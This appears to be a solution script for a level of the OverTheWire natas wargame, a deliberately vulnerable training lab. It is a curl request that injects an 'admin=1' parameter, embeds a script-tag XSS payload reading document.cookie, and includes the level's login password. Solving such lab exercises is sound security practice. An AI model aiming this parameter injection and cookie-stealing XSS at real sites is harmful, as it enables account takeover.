#!/usr/bin/env bash
curl -iv http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug \
    -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ \
    -c exp-cookie \
    -d align=left \
    --data-urlencode "fontsize=200%;'><script>alert(document.cookie);</script></div><div style=background-color: red" \
    -d bgcolor=green \
    -d submit=Update \
    -d admin=1 \
    #-b PHPSESSID=eb03n2rnj862ks1jb29429hu50 \
# Send an array that's encoded PHPSESSID = Array( 
# --data-urlencode "fontsize=200%;'><script>document.cookie = 'admin=1'; window.location = 'http://natas21.natas.labs.overthewire.org/index.php?' + document.cookie;</script></div><div style=background-color: red" \
